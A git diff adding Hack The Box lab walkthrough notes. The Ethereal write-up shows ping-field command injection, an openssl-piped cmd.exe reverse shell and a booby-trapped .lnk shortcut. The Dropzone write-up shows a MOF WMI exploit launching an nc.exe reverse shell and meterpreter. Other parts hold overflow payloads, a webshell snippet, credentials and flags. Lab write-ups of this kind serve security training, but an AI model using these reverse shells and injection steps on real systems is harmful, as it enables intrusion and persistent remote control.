@@ -1,3 +1,231 @@
+HTB ETHEREAL
+1)First its first so we do an nmap scan showing us the following result:
+80 tcp
+8080 tcp
+21 tcp
+ 
+with no udp ports open
+ 
+so ftp its open and we to to test that service out and download everything thats in there using:
+mget *
+ 
+2)Then with gobuster i run it on http://10.10.10.106 which give us this interesting dirs:
+ 
+On port 80:
+ 
+-http://10.10.10.106/
+-http://10.10.10.106/corp/console/admin.aspx
+-http://10.10.10.106/crop/help/assistance.aspx
+ 
+On port 8080:
+i had seen the link to http://ethereal.htb:8080 on the admin page, we add 10.10.10.106 ETHEREAL.HTB to /etc/hosts, and then was able to see a basic auth login page.
+ 
+There was a false user flag  in the admin desktop page.
+ 
+3)So now we now we need some credentials to login onto the webpage on 8080.
+so read throught stuff we found in ftp more carefully:
+ 
+so to check FDISK,DISK1,DISK2, contents we can run:
+mkdir ./mnt && mkdir ./mnt/FDISK && mount -o loop FDISK ./mnt/FDISK
+mkdir ./mnt && mkdir ./mnt/DISK1 && mount -o loop DISK1 ./mnt/DISK1
+mkdir ./mnt && mkdir ./mnt/DISK2 && mount -o loop DISK2 ./mnt/DISK2
+ 
+so in FDISK we manage to found pbox.exe and pbox.dat
+after researching i found pbox.exe its somewhat linked to an old emulator for games and dos programs named "DOSBOX""
+and we can install in our kali wiht apt-get install dosbox
+Now in dosbox we can mount our files like this:
+mount c /path/to/box/files
+running pbox.exe ask for cwsdpmi.zip its some sort or a depency so we download from here:
+https://www.dosgames/com/files/cwsdpmi.zip
+and extract and place on /mnt/FDISK/pbox/
+now we can mount our path and run pbox.exe which ask for a password so we use the most common password:  "password""
+and we are in.
+ 
+4)now some sort of database program show up everytime we select one item it shows us a user and a password so we can make a list out of and crack it trought hydra
+ 
+hydra -L user.txt -P password.txt http-get://ethereal.htb:8080
+ 
+and was able to get basic auth:
+ 
+user:       alan   
+password:   !C414m17y57r1k3s4g41n!
+ 
+we test it in our 8080 port site and we are in with an admin console and a test box that shows test connection.
+so immediately go and test my ip showing and see that connection its successful.
+ 
+Then tried appeding commands after ping command using &&, ||, |
+ 
+Was able to run commands at first with
+ || for /f "tokens" %i in ('whoami') do nslookup %i 10.10.15.110
+without my ip addres which shows me the name 'etherealalan' on wireshark results.
+ 
+If played with the token number was able to see whichever word of a response i selected as the token number.
+e.g. if the response to whoami was "ethereal\alan" the backslash character does not travel through the results we can view, so the token =1, would give me the world etherealalan, whereas if i did the command "echo test 123", token =1 would show test and token=2 would show 123.
+ 
+At this point it was safe to say we were dealing with blind read-only RCE.
+Enumerating this way was an absolute pain and i had to check my other options.
+ 
+Since i knew i couldnt execute anything, i wanted to know why.
+ 
+I checked the firewall rules, using:
+netsh advfirewall firewall show rule name=all
+ 
+this showed port 73 and 136 are open and openssl.exe installed.
+ 
+so we can do this:
+-first we create our key.pem and cert.pem with this command:
+ 
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+ 
+-then we setup our first terminal and launch this command to listen on port 73:
+ 
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73
+ 
+-now on a second terminal we run this command to listen for connections port 136:
+ 
+openssl s_server -quiet -key key.pem -cert cert.pem -port 136
+ 
+and finally from admin console we launch this command:
+ 
+10.10.15.110 | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:136
+ 
+ 
+Now i was trying to run commands as it its on the shell i got but nothings seems to work after for mistake i typed a dir comand and hit send to see if it works then trying to open another shell with webadmin console i didnt stop my preovious shell an run the command again a magic the command worked!
+ 
+So to run commands we must execute the command on port 73 terminal then send admin console web command and it gets executed!
+Now we have to find a way to upload files researching we came to an easy solution
+ 
+on my kali:
+ 
+openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < uploadme.txt
+ 
+on webapp:
+ 
+10.10.15.110 | C:\Progra~2\OpenSLL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 > c:\users\public\desktop\shortcuts\saveme.txt
+ 
+while enumerating we found a file located in c:\users\public\desktop\note-draft.txt which said:
+"I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.
+-Alan
+this command its useful to run a command and if want an answer automatick respond
+echo yes | command to run
+ 
+ 
+Now we have to replace the lnk file located on C:\users\public\desktop\shortcut\"Visual Studio 2017.lnk""
+ 
+sow we can generate one with this program
+ 
+LNKUp(on github)
+ 
+python generate.py --host localhost --type ntlm --output pay.lnk --execute "C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.15.110:136"
+ 
+then we can encoded in base 64 doing
+ 
+openssl base64 -A -e -in pay.lnk -out pay
+ 
+then copy the string encoded and go to windows machine and run this command:
+ 
+echo | set /p="base64 encoded string" > c:/users/public/desktop/shortcuts/pipo.txt
+ 
+next step its to decode the file which one we put encoded string and at the same time replace the visual studio.lnk
+so we navigate to the dir containing the .lnk file and do this :
+ 
+cd c:\users\public\desktop\shortcuts
+c:\progra~2\openssl-v1.1.0\bin\openssl base64 -A -d -in pipo.txt -out "Visual Studio 2017.lnk"
+type c:\users\public\desktop\shortcuts\"Visual Studio 2017.lnk"# to check if the lnk got replaced
+then if it got replaced you have to kill the 2 shell connections and start it again to wait for jorges connection:
+***note***
+We have to be precise with timing cuz it seems the lnk file gets replaced by the original every few minutes so maybe it will not work at first time cuz timing.
+ 
+Once we have the connection we can now read the user flag.
+type c:\users\jorge\desktop\user.txt
+2b9a4ca09408b4a39d87cbcd7bd524dd
+ 
+ 
+ 
+*************************************************************
+ 
+HTB DROPZONE
+1)As usual we start nmap with tcp but nothings shows up wear
+2)now we launch upd scan and we got 1 port
+69 upd tftp server
+3)now we can launch tftp scripts with nmap and found boot.ini
+4)Connecting to the server we download the file
+and we see
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+5)now searching for vulnerabilities we found stuxnet and reading about it i found it uses 4 vulnerabilities one of them its the mof file injection so we can read about it in:
+http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html
+6)so we developed our mof file like this:
+#pragma namespace ("\\\\.\\root\\subscription")
+ 
+class MyClass7307
+{
+ [key]
+ string Name;
+};
+ 
+instance of __EventFilter as $FILTER
+{
+    Name = "XPLOIT_TEST_SYSTEM";
+    EventNamespace = "root\\subscription";
+ Query = "SELECT * FROM __InstanceCreationEvent "
+         "WHERE TargetInstance.__class = \"MyClass7307\"";
+ 
+    QueryLanguage = "WQL";
+};
+ 
+instance of ActiveScriptEventConsumer as $CONSUMER
+{
+    Name = "XPLOIT_TEST_SYSTEM";
+    ScriptingEngine = "VBScript";
+ 
+    ScriptText =
+      "Set objShell = CreateObject(\"WScript.Shell\")\n"
+   "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 10.10.15.110 4444 -e C:\\Windows\\system32\\cmd.exe\"\n";
+};
+ 
+instance of __FilterToConsumerBinding as $BIND
+{
+    Consumer = $CONSUMER ;
+    Filter = $FILTER ;
+};
+ 
+instance of MyClass7307{
+ Name = "Woot";
+};
+7)then we upload nc.exe to c:\ and the mof file to windows\system32\wbem\mof\filename
+if we want to see if the mof gets compiled we can download the log from windows\system\32\wbem\logs\mofcomp.log
+Everytime we want to upload the mof file we should change the names of the class and of the exploit_test_name
+now we setup our nc listener and upload the mof and we got a shell but instanstly we got kick off
+so i upload a meterpreter payload made with msfvenom.
+Did process again and once on nc shell we call our payload with absolute path and boom we have a meterpreter
+ 
+Now searching for user.txt
+ 
+8)Now looking for that damn flag i got to administrator/Desktop
+where its a root.txt and flag folder both of them are a troll
+For limited time only!                                                                                                          
+Keep an eye on our ADS for new offers & discounts!
+ 
+Now seeing to that ADS thing its has to be a hint so i found something about:
+ 
+ALTERNATE DATA STRINGS
+its a way to hide or something like it text or files in ntfs systems.
+So searching for a way to get read or search that kind of files i found this tool
+streams.exe now e upload and run it accept the eula
+and on administrator\desktop\
+ 
+we run it with streams -s
+ 
+Showing us both flags that were hidden!
+USER:a6a4830ddd27a1bddd59d2aaa80f7940
+ROOT:45cd53a83bf364456386816e35e6a98e
+ 
+ 
+******************************************
 HTB DAB
 1)Nmap show us 4 port
 21 tcp ftp
@@ -175,6 +403,7 @@ run ldconfig to change variable path.
 execute myexec and get root flag:
 45cd53a83bf364456386816e35e6a98e
  
+***************************************************
 HTB SMASHER
 1)Nmap throws us some results open ports:
 6969 tcp acmsoda
@@ -185,6 +414,8 @@ HTB SMASHER
 it seems theres a service that restarts every 60 seconds that why i was no having responses at all
 4)Again runing dirb doesnt shows anything
 5)In 1111 webpage we see theres something like dir we select index.html and see a login page perhaps we can navigate further if we scape another "/" so we go to http://10.10.10.89:1111// and we see all the dirs listed online.
+ 
+*************************************
  
 HTB CURLING
 1)Enumeration with nmap show us 2 open port 80,22
@@ -220,7 +451,9 @@ from etc/shadow  root hash>>>>  $6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyj
  
 and we got the root flag: 82c198ab6fc5365fdc6da2ee5c26064a
  
-HTB REDISH
+**********************************************
+ 
+HTB REDDISH
 1)As usual we run our nmap scan and show us just tcp port 1880
 2)we navigate to it in browser and just got a /get response
 3)gobuster -t 150 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-
@@ -445,6 +678,8 @@ we locate the root flag in  root.txt: backupfs/tmp/d/root/root.txt
  
 50d0db644c8d5ff5312ef3d17c2ed205
  
+********************************************
+ 
 HTB GIDDY
 1)Enumeration with zenmap show open ports 80,443,3389
 2)Going with browser to the machine ip shows us its a IIS server.
@@ -507,6 +742,7 @@ stop-service "Ubiquiti UniFi Video"; ps;   ## notice we append the ps command fo
 24)And we got a reverse nc shell with authority-system privileges
 25)Grab your root flag  : >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> CF559C6C121F683BF3E56891E80641B1
  
+*************************************************
  
 HTB ZIPPER
 1)Nmap shows open port 80 and 22
@@ -540,6 +776,7 @@ so first:
 4) ./zabbix-service ... start
 5) read the root flag  >>>>>>>>>>>>>>>>>>>>>  a7c743d35b8efbedfd9336492a8eab6e
  
+*****************************************
  
 HTB MISCHIEF
 1)Enumeration shows open port 22, 3366 and upd 161 running snmp
@@ -603,6 +840,8 @@ so we navigate to that dir and cat root.txt with its content:
  
 ae155fad479c56f912c65d7be4487807
  
+************************************************
+ 
 HTB FROLIC
  
 1) As always enum
@@ -647,6 +886,8 @@ python -c 'print "A"*48+"B"*4+"\xe0\x97\xec\xb7"+"\xc8\x97\xec\xb7"+"\x0b\x4a\xf
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 24)run ./rop $(exploit)
 25)cat root flag   85d3fdf03f969892538ba9a731826222
+ 
+**********************************************
  
 HTB CARRIER
 1)Do a full port scan TCP and UDP
@@ -711,6 +952,7 @@ when it connects throw a 220 FTP response and then a 331 FTP response and it wil
 15)get root flag and secret
 Root flag: 2832e552061532250ac2a21478fd4866
  
+*********************************************
  
 HTB SECNOTES
 1)Enumeration with nmap discovering open ports full tcp scan all ports
@@ -734,6 +976,8 @@ if(isset($_REQUEST['cmd'])){
 smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$
 8)GET the root.txt flag
  
+***********************************************
+ 
 HTB YPUFFY
 1) Enum ldap and find the hashes for alice user
 2) use the hashes with smb login
@@ -745,6 +989,8 @@ HTB YPUFFY
 doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I alice1978 -n 3m3rgencyB4ckd00r id_rsa
 8)login with ssh to root@localhost with private key
 9)flag
+ 
+***********************************************
  
 HTB Bounty
 1)Enumerate and find .aspx files
@@ -761,6 +1007,7 @@ set payload windows/x64/meterpreter/reverse_tcp
 or looking for proccess that are already running in x64 and migrate to it
 8)run post explotation module and exploit(root)
  
+******************************************************
  
 HTB WALDO
  
@@ -772,6 +1019,8 @@ HTB WALDO
 4)login again with the same ssh key from remote machine as monitor to localhost with args -t bash -norc" without quotes to break the default bash login
  
 5)run "/usr/bin/tac /root/root.txt
+ 
+***************************************************
  
 HTB HAWK
  
